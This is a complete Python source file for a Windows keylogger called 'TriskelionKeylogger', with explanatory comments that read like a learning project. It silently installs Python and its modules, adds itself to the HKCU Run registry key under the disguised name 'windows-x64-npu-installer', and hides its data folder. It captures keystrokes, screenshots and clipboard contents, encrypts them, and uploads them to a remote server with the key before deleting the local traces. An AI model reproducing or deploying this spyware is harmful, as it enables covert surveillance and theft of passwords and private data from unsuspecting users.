import subprocess # execution of system commands as well as processed
import sys
import winreg as reg # addition of the keylogger file to the Windows Registry
import os # operating system interaction
import json
import requests # http requests
import pyautogui # capturing screenshots
import pyperclip as clipboard # capturing data on the clipboard
import time
import uuid # unique IDs for the filenames
import keyboard # keystroke capture
from threading import Thread, Event, Timer # threading functionality
from datetime import datetime, timedelta
from cryptography.fernet import Fernet # file encryption

python_installer_url = "https://www.python.org/ftp/python/3.10.0/python-3.10.0-amd64.exe" # url for downloading the python installer
installer_path = os.path.join(os.getenv('TEMP'), "python-installer.exe") # path for saving the downloaded installer - obtains value of environ var TEMP for storing temporary files

def check_python_installed():
    # check whether or not python is installed
    try:
        result = subprocess.run(['python', '--version'], capture_output=True, text=True) # execute command to get python version on device. output is then stored to result as text
        if result.returncode == 0: # success of command
            print("Python is already installed.")
            return True
    except FileNotFoundError:
        pass
    return False

def download_python_installer():
    # from previous command if output is false then download the installer
    try:
        response = requests.get(python_installer_url, stream=True) # send http get to url and downloads the file in chunks
        with open(installer_path, 'wb') as file: # opens a file at the path in write binary mode
            for chunk in response.iter_content(chunk_size=8192): # process installer download in chunks of 8192
                file.write(chunk)
        print("Python installer downloaded.")
    except Exception as e:
        print(f"Failed to download Python installer: {e}")
        sys.exit(1) # terminate and indicate error

def install_python():
    try:
        # Run the installer silently
        subprocess.run([installer_path, '/quiet', 'InstallAllUsers=1', 'PrependPath=1'], check=True) # run command without user interaction and install for all users and add python to system path variable for cmd integration
        print("Python installation completed.")
    except subprocess.CalledProcessError as e:
        print(f"Failed to install Python: {e}")
        sys.exit(1)

required_modules = [
    'keyboard', 'requests', 'pyautogui', 'pyperclip', 'threading', 
    'datetime', 'time', 'os', 'cryptography'
] # list of modules required for the keylogger to execute

def install_module(module_name):
    subprocess.check_call([sys.executable, '-m', 'pip', 'install', module_name]) # path to python interpreter used to invoke pip and runs pip using -m to run it as a script

def check_and_install_modules(modules):
    for module in modules: # iterates over each module
        try:
            __import__(module) # attempts to import the module
        except ImportError:
            print(f"Module '{module}' is not installed. Installing...")
            install_module(module)
            print(f"Module '{module}' installed successfully.")

check_and_install_modules(required_modules)

config_file_path = 'config.json' # path to store and read configuration information
if not os.path.exists(config_file_path):
    config = {
        "serverURL": "http://192.168.35.205:5000/upload",
        "capturedDataDir": "C:\\CapturedData",
        "screenshotInterval": 5,
        "keystrokeInterval": 60,
        "clipboardInterval": 10
    } # dictionary with configuration information
    with open(config_file_path, 'w') as config_file: # open the config.json to write data
        json.dump(config, config_file) # writes config dictionary to the tile
else: # if file exists 
    with open(config_file_path, 'r') as config_file: # open file and read the stored configurations
        config = json.load(config_file)

# global variables
SERVER_URL = config['serverURL']
CAPTURED_DATA_DIR = config['capturedDataDir']
SCREENSHOT_INTERVAL = config['screenshotInterval']
KEYSTROKE_INTERVAL = config['keystrokeInterval']
CLIPBOARD_INTERVAL = config['clipboardInterval']

# generate key for file encryption
def generate_key():
    return Fernet.generate_key()
# save key 
def save_key(key):
    with open('encryption_key.key', 'wb') as key_file: # opens file as write binary
        key_file.write(key)

# Load the encryption key
def load_key():
    with open('encryption_key.key', 'rb') as key_file: # opens file as read binary
        return key_file.read() # read file contents and return as bytes

key = generate_key()
save_key(key)

def encrypt_file(file_path, key):
    cipher = Fernet(key) # create a cipher object using the key
    try:
        with open(file_path, 'rb') as file: # open file in file path in read binary mode
            original = file.read()
        encrypted = cipher.encrypt(original) # encrypts the original file
        with open(file_path, 'wb') as file: # open file in file path in write binary mode
            file.write(encrypted) # write encrypted file in the file
        print(f"File '{file_path}' encrypted successfully.")
    except Exception as e:
        print(f"Failed to encrypt '{file_path}': {e}")

def ensure_hidden_directory(path):
    if not os.path.exists(path): # checks if file specified at param path exists
        os.makedirs(path) # make the directory
    subprocess.call(["attrib", "+H", path]) # sets the directory attribute to hidden

ensure_hidden_directory(CAPTURED_DATA_DIR)

class TriskelionKeylogger:
    def __init__(self):
        self.startDateTime = datetime.now() # curr datetime for keylogger start
        self.endDateTime = datetime.now() # curr datetime for keylogger finish
        self.capturedDataDir = CAPTURED_DATA_DIR # dir for storing the keystrokes
        self.stop_event = Event() # sync between threads

    def sendData(self, filePath, key):
        with open(filePath, 'rb') as f: # open file at filePath as read binary
            files = {'file': f} # file dictionary with key file
            try:
                response = requests.post(SERVER_URL, files=files, data={'key': key}, timeout=30) # http post request to server url with files to be uploaded and encryption key, timeout 30s for request
                print(response.status_code, response.reason)
            except Exception as e:
                print(f"File failed to upload: {e}")

    def updateFileName(self, filePrefix, fileExtension):
        startDateTimeStr = str(self.startDateTime)[:-7].replace(" ", "-").replace(":", "")
        endDateTimeStr = str(self.endDateTime)[:-7].replace(" ", "-").replace(":", "")
        unique_id = uuid.uuid4().hex # unique identifier for ensuring uniqueness of filename
        return f"{filePrefix}-{startDateTimeStr}_{endDateTimeStr}{unique_id}{fileExtension}"

    def screenshotCapture(self):
        def capture_screenshot(): # inner function
            while not self.stop_event.is_set(): # loop as long as event is not set to signal termination
                time.sleep(SCREENSHOT_INTERVAL) # pause
                imgName = self.updateFileName("Screenshot", ".png") # generate filename for screenshot
                img = pyautogui.screenshot()
                filePath = os.path.join(self.capturedDataDir, imgName) # constructs filepath where file will be saved
                img.save(filePath)
                print(f"Screenshot captured to {filePath}")
                encrypt_file(filePath, key)
                self.sendData(filePath, key)
                Timer(1, lambda: os.remove(filePath)).start() # wait one second before deleting using lambda

        screenshotCaptureThread = Thread(target=capture_screenshot) # create thread to run function
        screenshotCaptureThread.start() # start thread

    def keystrokeCapture(self):
        def capture_keystrokes(): # inner function
            keystrokeLog = "" # string to save keystrokes
            self.startDateTime = datetime.now() # start time for the capture
            self.endDateTime = self.startDateTime + timedelta(seconds=KEYSTROKE_INTERVAL) # gets end time by addint start time plus 60

            def callback(event): # callback function for whenever a key is released
                nonlocal keystrokeLog # use same prev variable to for modifications
                name = event.name # name of key released
                
                if len(name) > 1: # handle special keys
                    if name == "space":
                        name = " "
                    elif name == "enter":
                        name = "[ENTER]\n"
                    elif name == "decimal":
                        name = "."
                    else:
                        name = name.replace(" ", "_")
                        name = f"[{name.upper()}]"

                keystrokeLog += name # append name to the keystrokeLog variable

            keyboard.on_release(callback) # calls callback function with every key release

            print(f"Keystroke capture started at {self.startDateTime}")

            while datetime.now() < self.endDateTime and not self.stop_event.is_set(): # loop until endtime is reached or stop_event is set
                time.sleep(1) # pause 

            keyboard.unhook_all() # unregister all keyboard event handlers

            keystrokeFileName = self.updateFileName("Keystrokes", ".txt")
            filePath = os.path.join(self.capturedDataDir, keystrokeFileName)
            with open(filePath, 'w') as file:
                file.write(keystrokeLog)
            print(f"Keystroke log saved to {filePath}")
            encrypt_file(filePath, key)
            self.sendData(filePath, key)
            Timer(1, lambda: os.remove(filePath)).start() # delete file

        keystrokeCaptureThread = Thread(target=capture_keystrokes) # create thread
        keystrokeCaptureThread.start() # start thread

    def clipboardCapture(self):
        def capture_clipboard(): # inner function
            last_content = "" # store last content in clipboard
            while not self.stop_event.is_set(): # loop until stop_event is set
                time.sleep(CLIPBOARD_INTERVAL)
                current_content = clipboard.paste() # get data currently in the clipboard

                # skip if clipboard is empty
                if not current_content:
                    continue
                
                # skip if content hasn't changed
                if current_content == last_content:
                    continue

                last_content = current_content # update for later comparison in the loop
                clipboardFileName = self.updateFileName("ClipboardCapture", ".txt")
                filePath = os.path.join(self.capturedDataDir, clipboardFileName)
                with open(filePath, 'w') as file:
                    file.write(current_content)
                print(f"Clipboard data captured to {filePath}")
                encrypt_file(filePath, key)
                self.sendData(filePath, key)
                Timer(1, lambda: os.remove(filePath)).start() # delete file

        clipboardCaptureThread = Thread(target=capture_clipboard) # create thread
        clipboardCaptureThread.start() # start thread

    def stop(self):
        self.stop_event.set() # set flag to true and signal stop operation

def add_to_startup(file_path=None): # file path parameter's default set to none 
    if file_path is None:
        file_path = os.path.realpath(sys.argv[0]) # set to path of the currently running file, this case downloads
    
    # define key and value
    key = r"Software\Microsoft\Windows\CurrentVersion\Run" # registry path for startup programs
    value = "windows-x64-npu-installer" # name of entry to be included in the registry 
    
    # open the key and set value
    key_open = reg.OpenKey(reg.HKEY_CURRENT_USER, key, 0, reg.KEY_ALL_ACCESS)
    reg.SetValueEx(key_open, value, 0, reg.REG_SZ, file_path) # creates a new registry value
    reg.CloseKey(key_open)
    print(f"Added {file_path} to startup registry.")

if __name__ == "__main__":
    if not check_python_installed():
        print("Python is not installed. Installing...")
        download_python_installer()
        install_python()
        print("Python installation completed.")
        time.sleep(30)

    add_to_startup()

    keylogger = TriskelionKeylogger() # creates class instance
    keylogger.screenshotCapture()
    keylogger.keystrokeCapture()
    keylogger.clipboardCapture()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("Triskelion has been stopped.")
        keylogger.stop()
